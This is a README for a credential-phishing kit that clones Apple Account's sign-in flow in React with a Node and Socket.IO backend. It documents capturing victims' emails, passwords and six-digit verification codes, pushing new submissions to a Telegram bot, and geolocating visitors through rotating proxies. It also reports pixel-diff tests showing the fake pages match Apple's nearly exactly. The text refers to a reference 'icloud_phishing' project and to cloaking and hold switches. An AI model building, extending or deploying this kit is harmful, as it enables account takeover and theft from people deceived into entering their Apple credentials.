# Apple Account — React + Tailwind front end, Node backend, Socket.IO, Telegram

A React 19 + Tailwind rebuild of the five screens that make up the sign-in flow in
`../icloud_phishing`, plus a small, readable backend:

- **web process** (`server/index.js`) serves the built React app and resolves the
  visitor's IP + country through rotating proxies;
- **Socket.IO process** (`server/socket/index.js`, separate port) carries public
  events and a password-protected admin namespace;
- **Telegram bot** (grammY) runs beside the socket server and shares its store;
- **Python client** template for the same Socket.IO server.

The front end is not "Tailwind-ish": it is the same page. Same box sizes, same
fonts, same colours, same spacing, same states. The comparison harness in
`compare/` measures the rebuilt page against the reference project and reports
the pixel difference.

| Reference page | Route | What it is |
| --- | --- | --- |
| `site/index.html` + `site/widget.html` | `/sign-in` (also `/`) | Apple Account shell, global nav, local nav, ring artwork, email → password |
| loading state (`site/css/loading.css`, `page.js` veil) | `/loading` | the sign-in page under Apple's blurred veil and spinner |
| `site/verify.html` / `verify-step.html` | `/verify` | six-box verification-code step |
| `site/terms.html` | `/terms` | scrollable Terms and Conditions, one action |
| `site/done.html` | `/done` | success card |
| — | `/admin` | password-protected Socket.IO dashboard |

"Login" is the `/sign-in` screen and carries both states in the same card, as
Apple does: the email step on first paint, then the joined account/password
fields, Remember me and Forgot password?. Clicking the account field goes back
to the email step. The card keeps its height across the swap, so the page does
not jump; the password is captured with the email and sent when the code step
completes.

The flow is wired end to end:

```
/sign-in ──email─Continue──▶ password ──Sign In──▶ /loading ──3.5 s──▶ /verify
        ──6 digits──▶ /terms ──Agree──▶ /done
```

## Run

```bash
npm install
npm run dev                   # front end only, http://127.0.0.1:5173
```

Full stack:

```bash
cp .env.example .env           # set ADMIN_PASSWORD at minimum
npm run build
npm run backend                # web :3000 + socket :4001
# open http://127.0.0.1:3000/sign-in and http://127.0.0.1:3000/admin
```

Or separately:

```bash
npm run serve                  # web only   :3000
npm run socket                 # socket only :4001 (+ Telegram if enabled)
```

`npm run start` builds and then runs both.

> The dev front end talks to `http://<host>:4001` by default. Set
> `VITE_SOCKET_URL` if the socket server lives elsewhere, or put both behind one
> reverse proxy and forward `/socket.io` to `:4001`.

## Architecture

```
browser ──HTTP──▶ web (:3000) ──▶ /api/geo ──▶ proxy pool ──▶ geo providers
   │                 └── dist/ (React SPA, /admin)
   │
   └──WebSocket──▶ socket (:4001)
                     ├── /public   anonymous: hello, submit, ping
                     ├── /admin    password in handshake: list/get/update/delete/notice
                     ├── store     in-memory + server/data/items.json
                     └── Telegram  grammY long polling
```

The web process never reads the store; the socket process owns it. They share
only the JSON file, which you can replace with Redis/Postgres by rewriting
`server/store.js` (five methods, four events).

### Web: IP + country

`GET /api/geo` returns the caller's address and location:

```json
{
  "ip": "8.8.8.8",
  "country": "United States",
  "countryCode": "US",
  "region": "Virginia",
  "city": "Ashburn",
  "source": "ip-api.com",
  "proxied": false,
  "cached": false
}
```

Three protections keep the free providers from rate-limiting you:

1. **TTL cache** (12 h by default) — one lookup per visitor per half day.
2. **Country header fast path** — `cf-ipcountry` / `x-country-code` skips the
   provider entirely when present.
3. **Proxy rotation + provider fallback** — `GEO_PROXIES` is a comma-separated
   list; each lookup starts at the next proxy, tries every provider, and falls
   back to a direct call only if `GEO_ALLOW_DIRECT=true`.

All free providers are key-less (ip-api.com, ipwho.is, ipapi.co). Add or remove
one in `server/geo/providers.js`; the normalised shape is the only contract.

Client address extraction handles `cf-connecting-ip`, `true-client-ip`,
`x-real-ip` and `x-forwarded-for` (`server/ip.js`), so it works behind nginx,
Cloudflare, or a PaaS proxy.

### Socket.IO security

The server is not an open event bus. Each namespace registers a **whitelist**;
anything else is an unknown event and is ignored.

| Namespace | Auth | Client may emit | Server emits |
| --- | --- | --- | --- |
| `/public` | none | `public:hello`, `public:submit`, `public:ping` | `public:state`, `public:count`, `public:notice` |
| `/admin` | password in handshake | `admin:list`, `admin:get`, `admin:update`, `admin:delete`, `admin:stats`, `admin:notice`, `admin:ping` | `admin:ready`, `admin:change` |

- The admin password is compared with `crypto.timingSafeEqual` before the socket
  connects (`server/socket/auth.js`). A wrong password produces a
  `connect_error: unauthorized` and no events are possible.
- Every admin handler also re-checks `socket.data.role === "admin"`, so moving a
  handler to the public namespace by mistake still fails closed.
- Payloads are validated with Zod; per-socket rate limits stop spam
  (`server/socket/rate-limit.js`).
- Public submissions are acknowledged with an id only; the full record never
  goes back to an anonymous client.
- The role and limits live on the server. The React page is not trusted.

Change `ADMIN_PASSWORD` in `.env`; the default is only for local development.

### Telegram bot

grammY is the async-first Telegram framework used here (the maintained
successor to Telegraf, with typed contexts and a much smaller surface). It is
disabled unless `TELEGRAM_ENABLED=true` and `TELEGRAM_BOT_TOKEN` are set.

The template demonstrates everything needed for a store-like control bot:

- inline keyboards + callback queries;
- paginated list (`‹ Prev` / `Next ›`) over the shared store;
- editing the current message in place (`editMessageText`), so navigation feels
  like an app rather than a chat;
- item detail, status buttons, delete with confirmation;
- optional user allow-list (`TELEGRAM_ALLOWED_USERS`);
- new-submission notification to `TELEGRAM_CHAT_ID`.

Commands: `/start`, `/list`, `/stats`. The bot reads and writes the same store
as Socket.IO, so an admin action in Telegram updates every open admin dashboard
immediately.

### Python client

```bash
python3 -m venv python/.venv
python/.venv/bin/pip install -r python/requirements.txt

python/.venv/bin/python python/client.py                 # public namespace
python/.venv/bin/python python/client.py --email you@example.com
ADMIN_PASSWORD=change-me-admin python/.venv/bin/python python/client.py --admin
```

`SOCKET_URL` overrides the default `http://127.0.0.1:4001`.

## Configuration

Every variable is documented in `.env.example`; all have defaults. The important
ones:

| Variable | Default | Meaning |
| --- | --- | --- |
| `PORT` | `3000` | web process |
| `SOCKET_PORT` | `4001` | Socket.IO process |
| `ADMIN_PASSWORD` | `change-me-admin` | `/admin` handshake password |
| `SOCKET_CORS_ORIGIN` | `*` | allowed socket origins |
| `GEO_PROXIES` | empty | rotating proxy list |
| `GEO_ALLOW_DIRECT` | `true` | direct provider fallback |
| `TELEGRAM_ENABLED` | `false` | start the bot |
| `TELEGRAM_BOT_TOKEN` | empty | BotFather token |
| `STORE_FILE` | `server/data/items.json` | persistence file |

## Compare against the reference

```bash
# 1. reference project on :5199 (from ../icloud_phishing)
cd ../icloud_phishing
PORT=5199 TELEGRAM_ENABLED=false CLOAK_ENABLED=false HOLD_ENABLED=false \
  node server/server.js

# 2. replica on :5173
cd ../icloud_phishing3 && npm run dev

# 3. capture, diff, write compare/REPORT.md + compare/summary.json + viewer.html
npm run compare

# 4. open the visual wipe viewer
open http://127.0.0.1:5173/compare/viewer.html
```

Other checks:

```bash
npm run compare:chrome       # header/local nav/footer/document boxes at 10 widths
npm run compare:width        # pixel diff at 600 / 768 / 834
npm run compare:responsive  # no horizontal scroll at 15 widths × 5 routes
npm run compare:flow         # email → loading → code → terms → success
```

The comparison scripts need Python 3 with Playwright and Pillow. `compare/py.sh`
uses `~/.cache/scampage-forge/venv` when it exists and otherwise falls back to
`python3` (install with `pip install playwright pillow && playwright install chromium`).

`compare/compare.py` renders both sides in Chromium at 1440×900 and 390×844,
waits for the fonts, uses one fresh document per shot, disables motion so the
rings and the spinner are a deterministic frame, and diffs the PNGs. The
reference is captured three times and the closest frame is kept, because the
reference itself is not perfectly deterministic: its sign-in card lives in an
iframe sized by script, and across identical reloads the Continue button paints
1 px apart.

## Fidelity results

The table measures the email step (the first paint). The password step is an
addition on the same card; checked separately, it lands within 0.1% at 1440 and
0.4% at 414 (the 390px reference reserves one line less, so its button sits
15px higher; the replica keeps the button where the email step left it).

Latest run (`compare/REPORT.md`, `compare/summary.json`):

| page | 1440×900 changed | 390×844 changed |
| --- | --- | --- |
| login | 0.007% | 0.021% |
| loading | 0.000% | 0.000% |
| verify | 0.000% | 0.007% |
| terms | 0.040% | 1.282%* |
| done | 0.000% | 0.006% |

\* The mobile Terms page is a deliberate improvement, not drift: the reference
draws its CTA 30 px wider than the legal box, so at phone widths the right
corner is clipped by 6 px. The replica aligns the CTA to the legal box on
`max-width: 734px`, gives the scroll fade more height, and hides the fade once
the reader reaches the end so the last lines stay readable. Desktop Terms is
unchanged (0.040%).

Chrome check: **0 mismatches** across 40 page/width pairs (global header,
local nav, footer, main and document height) at 320–1440. Width check at
768/834: every diff ≤ 0.075%; at 600 the only larger diff is the Terms CTA
(0.978%, same mobile improvement), everything else ≤ 0.125%. Responsive check:
**0 horizontal overflow cases** across 75 page/width pairs at 320–1920.

"changed" counts pixels whose channel difference exceeds 8/255. The residue is
sub-pixel text antialiasing (the reference renders some text through composited
layers, which switches Chromium between LCD and grayscale antialiasing), the
terms button label's subpixel baseline, and the final 1 px of the reference's
own iframe jitter.

## Motion and footer

- **Rings:** the reference's own `rings-drift` (26 s, ease-in-out, infinite
  alternate, 0.92–1 opacity).
- **Page entrance:** content fades and rises 6 px in 500 ms; it re-runs on each
  step. The comparison harness freezes animation, so measured geometry is
  unchanged.
- **Fields and buttons:** the email label uses the reference's 125 ms ease-in
  glide; inputs and buttons transition border/background over 150 ms; a typed
  OTP digit pops once; buttons press down slightly on click.
- **Accessibility:** everything above turns off under
  `prefers-reduced-motion: reduce`.
- **Footer:** the app shell is a `min-h-screen` flex column with `main` as
  `flex-1`, so a tall window pins the footer to the bottom edge instead of
  leaving white space under it. At 900 px height the chrome boxes are identical
  to the reference (0 mismatches).
- **Mobile Terms:** the CTA matches the legal box width (no clipped corner),
  the inner scroll uses `overscroll-contain`, and the bottom fade fades out at
  the end so the last lines are never permanently covered. On wider screens the
  reference geometry is kept.

## Layout

```
index.html                 Vite entry
tailwind.config.js         fonts + keyframes (ring drift, nib fade, veil, spin)
public/fonts/              SF Pro Text/Display, SF Pro Icons, shared-icons
public/assets/             rings.webp, privacy.svg, privacy-muted.svg, favicon
src/
  App.jsx                  routes, flow timer, public socket page events
  router.js                tiny history router (no dependency)
  index.css                @font-face + base type
  components/
    GlobalNav.jsx          Apple's 44/48 px global bar, SVG wordmarks
    LocalNav.jsx           "Apple Account" bar, 1 px hairline, phone chevron
    AppleFooter.jsx        the mini footer, desktop row / phone stack
    Landing.jsx            page shell + ring artwork
    Icons.jsx              nav + success icons
    Spinner.jsx            Apple's eight-nib spinner + loading veil
    navSvgs.js             the wordmarks, captured from the reference
  pages/
    Login.jsx              email + password states in one card
    Verify.jsx  Terms.jsx  Done.jsx
  admin/
    Admin.jsx              password form, stats, table, detail, broadcast
    useAdminSocket.js      /admin connection + ack helpers
  lib/socket.js            shared /public socket (hello, submit)
  data/termsHtml.js        the legal text, inline styles converted to classes
server/
  config.js                env -> one config object
  app.js                   Express app: dist/, /api/geo, SPA fallback
  index.js                 web process entry
  ip.js                    forwarded-header client IP + country helpers
  store.js                 Map + JSON persistence, events
  geo/
    index.js               cache -> header -> proxy rotation -> providers
    providers.js           ip-api / ipwho.is / ipapi.co normalisers
    proxy.js               ProxyAgent pool, round robin
    cache.js               TTL cache
  socket/
    index.js               separate-port server, owns the store, starts the bot
    public.js              anonymous whitelist
    admin.js               admin whitelist, password middleware, live updates
    auth.js                timing-safe password check
    rate-limit.js          per-socket event buckets
  telegram/
    bot.js                 grammY wiring, pagination, edit-in-place, notify
    views.js               message + keyboard builders
python/
  client.py                async public/admin client template
  requirements.txt
compare/
  compare.py               capture + diff + report
  flow_test.py             end-to-end front-end test
  width_check.py           600/768/834 pixel checks
  chrome_check.py          header/nav/footer geometry audit
  responsive_check.py      horizontal-overflow audit, 320–1920
  make_viewer.py           builds viewer.html from the screenshots
  viewer.html              wipe/difference viewer (open in the dev server)
  REPORT.md                generated fidelity report
  shots/                   reference, replica and amplified-diff PNGs
```

## Template notes

- The store is deliberately tiny: `Map` + synchronous JSON writes. Swap
  `server/store.js` for a database and keep the events; neither
  Socket.IO nor the bot needs to change.
- The Telegram bot and Socket.IO share one process because they share the store.
  To split them, expose the store over HTTP or move both to Redis.
- `server/data/items.json` is git-ignored and contains two demo rows on first
  run (`STORE_SEED=false` disables them).
- `ADMIN_PASSWORD` is plaintext in the environment because this is a template.
  For production, hash it (argon2/bcrypt) and compare the hash in
  `server/socket/auth.js`; the rest of the flow stays the same.
- Submitted passwords are stored in plaintext in `server/data/items.json` (this
  is a capture template, not a password manager). Encrypt them at rest if the
  store outlives a demo.
